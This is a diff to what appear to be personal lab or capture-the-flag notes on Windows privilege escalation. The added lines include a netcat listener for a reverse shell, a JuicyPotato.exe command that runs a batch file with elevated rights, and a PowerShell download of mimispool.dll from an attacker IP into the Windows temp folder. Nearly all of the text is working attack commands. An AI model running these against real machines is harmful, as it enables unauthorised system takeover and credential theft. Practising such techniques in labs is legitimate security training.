@@ -15,7 +15,14 @@ then we grab it from the victim machine
 we can grab a CLSID from here: 
 `https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/`
 
+set up a listener on attacker machine
+`nc -lvnp 5555`
+
 we then execute this command to run the batch file
 ```
 JuicyPotato.exe -l 1337 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}" -p hax.bat -t *
 ```
+
+this will give us root
+
+powershell -c "Invoke-WebRequest" -Uri 'http://10.10.14.6:80/mimispool.dll' -OutFile 'c:\windows\temp\mimispool.dll'
